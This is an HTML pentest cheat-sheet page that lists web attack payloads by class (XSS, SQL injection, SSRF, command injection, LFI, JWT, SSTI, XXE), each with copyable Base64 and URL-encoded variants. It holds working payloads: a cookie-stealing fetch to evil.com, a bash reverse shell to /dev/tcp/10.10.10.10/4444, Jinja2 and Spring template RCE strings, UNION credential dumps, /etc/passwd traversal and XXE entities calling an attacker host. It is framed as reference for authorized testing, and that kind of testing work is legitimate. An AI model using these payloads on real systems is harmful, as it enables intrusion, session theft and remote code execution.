@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Web Security Field Notes — Linux One-Liners</title>
+<style>
+:root{--bg:#12141a;--bg2:#191c24;--ink:#e7e6e1;--dim:#9a9fae;--line:#2a2e3a;--amber:#e0a458;--red:#d9705f;--teal:#5fb3a3;font-size:16px}
+@media (prefers-color-scheme:light){:root:not([data-theme="dark"]){--bg:#f3f1ec;--bg2:#ffffff;--ink:#1c1d21;--dim:#5a5d68;--line:#ddd8cd}}
+:root[data-theme="dark"]{--bg:#12141a;--bg2:#191c24;--ink:#e7e6e1;--dim:#9a9fae;--line:#2a2e3a}
+*{box-sizing:border-box}
+html{scroll-padding-top:calc(58px + env(safe-area-inset-top,0px))}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:'JetBrains Mono',ui-monospace,Consolas,monospace;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);line-height:1.5}
+header{position:sticky;top:env(safe-area-inset-top,0px);z-index:10;background:var(--bg);border-bottom:1px solid var(--line);padding:12px 16px;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+header h1{font-size:14px;margin:0;color:var(--amber);white-space:nowrap}
+header h1 span{color:var(--dim);font-weight:400}
+nav{display:flex;gap:2px;overflow-x:auto;flex:1;min-width:0}
+nav a{color:var(--dim);text-decoration:none;font-size:11.5px;padding:6px 8px;border-radius:4px;white-space:nowrap}
+nav a:hover{color:var(--ink);background:var(--bg2)}
+main{max-width:940px;margin:0 auto;padding:26px 16px 70px}
+.lede{color:var(--dim);font-size:13px;max-width:70ch;margin-bottom:30px;border-left:2px solid var(--line);padding-left:14px}
+.lede strong{color:var(--ink)}
+section{margin-bottom:38px;scroll-margin-top:64px}
+.shead{display:flex;align-items:center;gap:10px;margin-bottom:4px}
+.shead h2{font-size:14px;text-transform:uppercase;letter-spacing:.06em;margin:0}
+.sev{font-size:9.5px;padding:2px 7px;border-radius:3px;letter-spacing:.05em;font-weight:600}
+.sev.CRITICAL{background:rgba(217,112,95,.15);color:var(--red)}
+.sev.HIGH{background:rgba(224,164,88,.15);color:var(--amber)}
+.sev.MEDIUM{background:rgba(95,179,163,.15);color:var(--teal)}
+.sev.INFO{background:var(--bg2);color:var(--dim)}
+section>p.purpose{color:var(--dim);font-size:12.5px;margin:0 0 14px;max-width:65ch}
+.card{border:1px solid var(--line);border-radius:7px;margin-bottom:10px;overflow:hidden;background:var(--bg2)}
+.card .p{font-size:12px;color:var(--dim);padding:9px 12px 6px}
+.row{display:flex;align-items:center;gap:8px;padding:5px 12px;border-top:1px solid var(--line)}
+.row .lbl{font-size:9.5px;color:var(--dim);width:36px;flex-shrink:0;letter-spacing:.04em}
+.row code{flex:1;min-width:0;overflow-x:auto;white-space:pre;color:var(--teal);font-size:12px;scrollbar-width:thin}
+.row.enc code,.row.url code{color:var(--ink);opacity:.85}
+.copybtn{flex-shrink:0;font:inherit;font-size:10.5px;background:transparent;color:var(--dim);border:1px solid var(--line);border-radius:4px;padding:3px 8px;cursor:pointer}
+.copybtn:hover{color:var(--ink);border-color:var(--dim)}
+.copybtn.done{color:var(--teal);border-color:var(--teal)}
+.note{margin-top:12px;font-size:11.5px;color:var(--dim);background:var(--bg2);border:1px solid var(--line);border-radius:6px;padding:10px 12px}
+.note strong{color:var(--red)}
+footer{color:var(--dim);font-size:11px;text-align:center;padding:18px;border-top:1px solid var(--line)}
+::selection{background:var(--amber);color:#12141a}
+@media(max-width:560px){.row .lbl{width:28px}.row code{font-size:11px}}
+</style>
+</head>
+<body>
+<header>
+  <h1>web<span>sec</span>.notes</h1>
+  <nav id="navlinks"></nav>
+</header>
+<main>
+  <p class="lede">Every command below shows its <strong>raw</strong> form plus a <strong>Base64</strong> and <strong>URL-encoded</strong> variant — computed live in your browser, tap Copy on any line. Reference material only: known payload patterns and CLI tools for authorized testing, nothing here executes on this page.</p>
+  <div id="app"></div>
+</main>
+<footer>Reference only — test responsibly, on systems you own or are authorized to assess.</footer>
+
+<script>
+const DATA = [
+{id:"recon",icon:"🛰️",title:"Recon & Tooling",sev:"INFO",purpose:"Map the attack surface before touching any specific vulnerability class.",items:[
+["nmap -sV -sC -p- target","Full port scan with service/version detection and default scripts"],
+["whatweb target","Fingerprint CMS, server, and JS libraries in use"],
+["curl -I target","Grab response headers to spot missing security headers"],
+["gobuster dir -u target -w wordlist.txt","Brute-force hidden directories and files"],
+["subfinder -d domain.com | httpx -sc","Enumerate live subdomains and their status codes"],
+["waybackurls domain.com | sort -u","Pull historical URLs that may reveal old params"],
+["nikto -h target","Automated scan for known misconfigs"],
+["wafw00f target","Detect which WAF sits in front of the app"],
+["curl -s target/robots.txt","Check disclosed paths not meant for crawlers"],
+["eyewitness --web -f urls.txt","Screenshot a list of URLs for quick triage"]
+]},
+{id:"xss",icon:"⚡",title:"XSS",sev:"HIGH",purpose:"Injecting script into pages that other users view, to run in their browser context.",items:[
+["<script>alert(1)<\/script>","Baseline PoC to confirm unescaped reflection"],
+["<img src=x onerror=alert(1)>","Bypasses filters that only strip <script> tags"],
+['"><svg onload=alert(1)>',"Breaks out of an HTML attribute context"],
+["javascript:alert(document.cookie)","Tests javascript: URI handlers on links"],
+["'-alert(1)-'","Breaks out of a JS string context inline"],
+["xsstrike -u \"target?q=FUZZ\"","Automated context-aware XSS fuzzing"],
+["dalfox url target","Fast parameter-based XSS scanning"],
+["cat urls.txt | gf xss","Filter URLs down to likely XSS-prone params"],
+['<iframe srcdoc="<script>alert(1)<\/script>">',"Tests sandboxed srcdoc contexts CSP may miss"],
+["fetch('//evil.com/c?'+document.cookie)","Cookie-exfil PoC for stored/DOM XSS"]
+]},
+{id:"sqli",icon:"💉",title:"SQL Injection",sev:"CRITICAL",purpose:"Manipulating a query by breaking out of the intended SQL string.",items:[
+["' OR '1'='1","Classic auth-bypass, WHERE clause always true"],
+["' UNION SELECT null,null-- -","Finds correct column count for UNION extraction"],
+["' AND SLEEP(5)-- -","Blind/time-based test with no reflected output"],
+["sqlmap -u \"target?id=1\" --batch --dbs","Automated detection and DB enumeration"],
+["sqlmap -r request.txt -D webapp -T users --dump","Dump a specific table from a captured request"],
+["' UNION SELECT username,password,NULL FROM users--","Extracts credentials once column count is known"],
+["1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -","Error-based DB version extraction"],
+["admin'-- -","Comments out remainder of query to skip password check"],
+["' AND IF(1=1,SLEEP(5),0)--","MySQL conditional time-based blind test"],
+["'; IF (1=1) WAITFOR DELAY '0:0:5'--","MSSQL time-based blind test"]
+]},
+{id:"csrf",icon:"🔁",title:"CSRF",sev:"MEDIUM",purpose:"Tricking an authenticated user's browser into firing a state-changing request.",items:[
+["<form action=target/transfer method=POST>","Auto-submitting form riding the victim's cookie"],
+["<img src=\"target/delete?id=1\">","Forges a GET state-change via an image tag"],
+["curl -i target/settings -H \"Cookie: session=x\"","Confirms endpoint accepts requests with no token"],
+["grep -ri csrf response.html","Checks whether the page embeds an anti-CSRF token"],
+["curl -X POST target/api -d amount=100 -b cookies.txt","Replays a request without the original token"],
+["python3 -m http.server 8000","Hosts a local CSRF PoC page for cross-origin testing"],
+["curl -I target -H \"Origin: https://evil.com\"","Checks if server validates Origin/Referer at all"],
+["curl target/api -X PUT -d '{\"role\":\"admin\"}'","Tests JSON endpoints for missing token checks"],
+["<meta name=referrer content=no-referrer>","Tests if stripping Referer bypasses checks"],
+["burp → Generate CSRF PoC","Auto-builds a PoC page from a captured request"]
+]},
+{id:"ssrf",icon:"🌐",title:"SSRF",sev:"CRITICAL",purpose:"Making the server itself issue requests to places it shouldn't reach.",items:[
+["http://127.0.0.1:80","Baseline test for internal loopback access"],
+["http://169.254.169.254/latest/meta-data/","Probes cloud instance metadata service"],
+["http://0177.0.0.1/","Octal-notation loopback filter bypass"],
+["http://0x7f000001/","Hex-notation loopback filter bypass"],
+["http://[::1]:80","IPv6 loopback form"],
+["nc -lvnp 8080","Local listener to confirm outbound requests land"],
+["http://target.com@127.0.0.1/","URL-parser confusion past domain allowlists"],
+["dig +short target-internal.local","Resolve internal hostnames the app might trust"],
+["gopher://127.0.0.1:6379/_SET key val","Protocol smuggling to reach internal services"],
+["http://spoofed.burpcollaborator.net","Out-of-band interaction to catch blind SSRF"]
+]},
+{id:"idor",icon:"🔓",title:"IDOR",sev:"HIGH",purpose:"Accessing another user's data by changing an identifier the app trusts blindly.",items:[
+["curl target/api/user/1001 -H \"Cookie: session=A\"","Requests another account's data with your own session"],
+["for i in $(seq 1 50); do curl -s target/invoice/$i; done","Iterates sequential IDs to find missing access control"],
+["ffuf -u target/user/FUZZ -w ids.txt -mc 200","Fuzzes ID values, flags ones that succeed"],
+["curl target/api/order/1 -X DELETE","Tests object-level checks on write/delete verbs"],
+["diff <(curl -s target/1) <(curl -s target/2)","Compares two responses for data leakage"],
+["curl target/api/user/1001.json","Tests alternate extensions that skip auth middleware"],
+["jq '.id' response.json | sort -u","Extracts IDs referenced in API responses"],
+["GET /api/user/42/profile","Horizontal privesc — swap 42 for another user ID"],
+["GET /admin/user/1/delete","Vertical privesc — low-priv user hits admin route"],
+["autorize (Burp extension)","Auto-replays requests as a lower-privileged user"]
+]},
+{id:"cmdi",icon:"🖥️",title:"Command Injection",sev:"CRITICAL",purpose:"Getting user input passed unsafely into a shell command.",items:[
+["127.0.0.1; whoami","Chains a second command (always runs)"],
+["127.0.0.1 && whoami","Runs only if the prior command succeeded"],
+["127.0.0.1 | whoami","Pipes output into a second command"],
+["127.0.0.1 `whoami`","Backtick substitution, older shells"],
+["127.0.0.1 $(whoami)","Command substitution inline"],
+["127.0.0.1; bash -i >& /dev/tcp/10.10.10.10/4444 0>&1","Reverse shell via injected command"],
+["commix --url=\"target?ip=1\"","Automated command injection detection tool"],
+["curl target/ping -d \"host=127.0.0.1;sleep 5\"","Time-based confirmation with no visible output"],
+["%0a id","Newline injection to start a fresh command"],
+["tcpdump -i any icmp","Confirms out-of-band execution via ping callback"]
+]},
+{id:"lfi",icon:"📂",title:"LFI & Path Traversal",sev:"HIGH",purpose:"Reading files outside the intended directory via a file-path parameter.",items:[
+["../../../../etc/passwd","Classic directory traversal to a system file"],
+["..%2f..%2f..%2fetc%2fpasswd","URL-encoded traversal past literal filters"],
+["....//....//etc/passwd","Double-dot trick surviving naive stripping"],
+["php://filter/convert.base64-encode/resource=index.php","Reads PHP source instead of executing it"],
+["/proc/self/environ","Leaks environment variables, sometimes secrets"],
+["../../../../etc/passwd%00","Null-byte truncation (legacy PHP < 5.3.4)"],
+["ffuf -u target?file=FUZZ -w lfi-wordlist.txt","Fuzzes common traversal payloads"],
+["/var/log/apache2/access.log","Log file target for log-poisoning to RCE"],
+["grep -r \"root:\" dump.txt","Confirms a successful /etc/passwd read"],
+["kadimus -u target","Automated LFI scanning and shell-upload chaining"]
+]},
+{id:"jwt",icon:"🔑",title:"JWT Attacks",sev:"HIGH",purpose:"Abusing weak signing, algorithm confusion, or unverified claims.",items:[
+["echo eyJhbGc... | cut -d. -f2 | base64 -d","Decodes the JWT payload to inspect claims"],
+["jwt_tool token.jwt -X a","Tests the alg:none bypass to forge a token"],
+["jwt_tool token.jwt -X k -pk public.pem","Tests RS256→HS256 algorithm-confusion attack"],
+["hashcat -m 16500 token.jwt wordlist.txt","Brute-forces a weak HMAC signing secret"],
+["jwt_tool token.jwt -T","Interactive claim tampering before re-signing"],
+["c-jwt-cracker token.jwt","Fast brute-force cracker for short secrets"],
+["echo -n \"h.p\" | openssl dgst -sha256 -hmac secret","Recomputes signature once secret is known"],
+["jwt_tool token.jwt -M pb","Runs a full playbook of known JWT attacks"],
+["curl target -H \"Authorization: Bearer FORGED\"","Confirms whether a modified token is accepted"],
+["jwt_tool token.jwt -jw wordlist.txt","Dictionary attack against the signing secret"]
+]},
+{id:"ssti",icon:"🧬",title:"SSTI",sev:"HIGH",purpose:"Server-side template engines evaluating attacker-controlled expressions.",items:[
+["{{7*7}}","Jinja2/Twig detection — returns 49 if vulnerable"],
+["${7*7}","Freemarker detection payload"],
+["<%= 7*7 %>","ERB (Ruby) detection payload"],
+["#{7*7}","Ruby generic detection payload"],
+["{{config.__class__.__init__.__globals__['os'].popen('id').read()}}","Jinja2 file/env read via globals traversal"],
+["${T(java.lang.Runtime).getRuntime().exec('id')}","Spring EL / Java SSTI to RCE"],
+["{% for x in ().__class__.__base__.__subclasses__() %}","Enumerates Python subclasses to find os access"],
+["curl target -d \"name={{7*7}}\"","Sends the probe payload to a template-rendering field"],
+["tplmap -u \"target?name=FUZZ\"","Automated SSTI detection and exploitation"],
+["grep -r '{{' logs.txt","Finds template syntax reflected in stored output"]
+]},
+{id:"xxe",icon:"📦",title:"XXE",sev:"HIGH",purpose:"An XML parser resolving external entities to read files or trigger SSRF.",items:[
+['<!DOCTYPE x [<!ENTITY a SYSTEM "file:///etc/passwd">]>',"Defines an external entity pointing at a local file"],
+["<foo>&a;</foo>","References the entity so the parser inlines the file"],
+['<!ENTITY a SYSTEM "http://attacker/ssrf">',"Turns XXE into an SSRF/out-of-band callback"],
+["curl -X POST target --data-binary @p.xml -H 'Content-Type: application/xml'","Sends a crafted XML body to an XML-parsing endpoint"],
+["xmllint --noent payload.xml","Locally verifies entity expansion before sending"],
+['<!ENTITY % pe SYSTEM "http://attacker/evil.dtd">',"Parameter-entity technique for blind XXE"],
+["grep -i xml burp_history.txt","Finds endpoints that accept XML input"],
+["unzip file.docx && edit [Content_Types].xml","Tests XXE via Office document uploads"],
+["php --version","Checks libxml version — older builds enable entities"],
+["curl target/upload -F file=@payload.xml","Tests file-upload endpoints that parse XML"]
+]},
+{id:"encoding",icon:"🔡",title:"Encoding / Decoding CLI",sev:"INFO",purpose:"Transform payloads to slip past filters, or decode captured data during analysis.",items:[
+["echo -n payload | base64","Base64-encode a payload for params expecting it"],
+["echo cGF5bG9hZA== | base64 -d","Decode a base64 string from traffic or a token"],
+["python3 -c \"import urllib.parse;print(urllib.parse.quote('<script>'))\"","URL-encode a payload to bypass literal filters"],
+["printf '%s' payload | xxd -p","Hex-encode a string for protocols expecting hex"],
+["echo 706179 | xxd -r -p","Decode a hex string back to text"],
+["echo -n payload | md5sum","Hash a string to compare against leaked dumps"],
+["echo test | tr a-zA-Z n-za-mN-ZA-M","ROT13 transform used in obfuscated payloads"],
+["python3 -c \"print('payload'.encode('utf-16'))\"","Re-encode as UTF-16 to bypass ASCII-only filters"],
+["python3 -c \"import urllib.parse as u,sys;print(u.unquote(sys.stdin.read()))\"","Decode a URL-encoded value from logs"],
+["jq -R -r @base64d <<< \"$JWT_PART\"","One-liner to decode a JWT segment"]
+]}
+];
+
+function b64(s){try{return btoa(unescape(encodeURIComponent(s)))}catch(e){return "(binary)"}}
+function urlenc(s){try{return encodeURIComponent(s)}catch(e){return s}}
+
+function row(label,text){
+  const d=document.createElement('div');
+  d.className='row '+label;
+  d.innerHTML='<span class="lbl">'+label.toUpperCase()+'</span><code></code><button class="copybtn">Copy</button>';
+  d.querySelector('code').textContent=text;
+  const btn=d.querySelector('button');
+  btn.addEventListener('click',async()=>{
+    try{await navigator.clipboard.writeText(text)}catch(e){}
+    btn.textContent='Copied'; btn.classList.add('done');
+    setTimeout(()=>{btn.textContent='Copy'; btn.classList.remove('done')},1200);
+  });
+  return d;
+}
+
+const app=document.getElementById('app');
+const nav=document.getElementById('navlinks');
+DATA.forEach(sec=>{
+  const a=document.createElement('a'); a.href='#'+sec.id; a.textContent=sec.icon+' '+sec.title; nav.appendChild(a);
+  const s=document.createElement('section'); s.id=sec.id;
+  s.innerHTML='<div class="shead"><h2>'+sec.icon+' '+sec.title+'</h2><span class="sev '+sec.sev+'">'+sec.sev+'</span></div><p class="purpose">'+sec.purpose+'</p>';
+  sec.items.forEach(([cmd,purpose])=>{
+    const card=document.createElement('div'); card.className='card';
+    const p=document.createElement('div'); p.className='p'; p.textContent=purpose;
+    card.appendChild(p);
+    card.appendChild(row('raw',cmd));
+    card.appendChild(row('b64',b64(cmd)));
+    card.appendChild(row('url',urlenc(cmd)));
+    s.appendChild(card);
+  });
+  if(sec.id==='encoding'){
+    const note=document.createElement('div'); note.className='note';
+    note.innerHTML='<strong>Scope note —</strong> this is reference text: known payload patterns and CLI tools also documented in OWASP\'s testing guide and public payload lists. Nothing on this page executes. Use only on systems you own or are explicitly authorized to test.';
+    s.appendChild(note);
+  }
+  app.appendChild(s);
+});
+</script>
+</body>
+</html>
